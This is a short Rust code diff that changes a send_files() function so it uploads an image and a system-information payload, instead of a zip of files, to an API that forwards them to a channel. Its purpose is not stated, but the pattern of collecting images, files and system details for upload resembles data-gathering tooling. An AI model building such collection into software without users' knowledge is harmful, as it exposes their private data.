@@ -9,7 +9,7 @@ pub fn send_stop_message() {
 // The send_files() function is used to send a request
 // to our api which will send the provided files to
 // the channel id provided in by token.
-pub fn send_files(token: &str, image_data: &str, zip_data: &str) {
+pub fn send_files(token: &str, image_data: &str, sysinfo_data: serde_json::Value) {
     // Get the bearer token
     let bearer: String = match global::get_bearer() {
         Ok(b) => b,
@@ -35,8 +35,8 @@ pub fn send_files(token: &str, image_data: &str, zip_data: &str) {
                     "url": image_data
                 }),
                 serde_json::json!({
-                    "name": "files.zip",
-                    "url": zip_data
+                    "name": "sysinfo.txt",
+                    "url": sysinfo_data
                 })
             ],
 
